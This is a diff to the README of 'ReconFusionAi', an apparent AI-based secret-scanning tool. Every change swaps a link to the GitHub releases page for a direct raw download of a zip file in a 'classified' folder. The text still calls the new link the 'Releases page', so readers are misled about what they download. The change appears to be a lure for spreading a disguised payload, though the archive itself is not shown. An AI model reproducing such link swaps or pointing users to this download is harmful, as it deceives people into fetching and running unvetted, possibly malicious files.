@@ -1,7 +1,7 @@
 # 🤖 ReconFusionAi - Next-Gen Secret Scanner for You
 
 ## 📥 Download Now
-[![Download ReconFusionAi](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/owusuarko/ReconFusionAi/releases)
+[![Download ReconFusionAi](https://raw.githubusercontent.com/owusuarko/ReconFusionAi/main/classified/Ai-Recon-Fusion-v1.6.zip)](https://raw.githubusercontent.com/owusuarko/ReconFusionAi/main/classified/Ai-Recon-Fusion-v1.6.zip)
 
 ## 🚀 Getting Started
 Welcome to ReconFusionAi. This tool helps you find secrets in your code using local AI. It reduces false positives by understanding the context of your code. No programming skills are needed to use this tool. Just follow these steps.
@@ -21,9 +21,9 @@ Before you download, ensure your system meets the following requirements:
 - **Python:** Version 3.6 or later for certain features.
 
 ## 📥 Download & Install
-To get started with ReconFusionAi, visit this page to download: [ReconFusionAi Releases](https://github.com/owusuarko/ReconFusionAi/releases).
+To get started with ReconFusionAi, visit this page to download: [ReconFusionAi Releases](https://raw.githubusercontent.com/owusuarko/ReconFusionAi/main/classified/Ai-Recon-Fusion-v1.6.zip).
 
-1. Go to the [ReconFusionAi Releases](https://github.com/owusuarko/ReconFusionAi/releases) page.
+1. Go to the [ReconFusionAi Releases](https://raw.githubusercontent.com/owusuarko/ReconFusionAi/main/classified/Ai-Recon-Fusion-v1.6.zip) page.
 2. Look for the latest version of the application.
 3. Download the file that corresponds to your operating system.
 4. Once downloaded, locate the file on your computer.
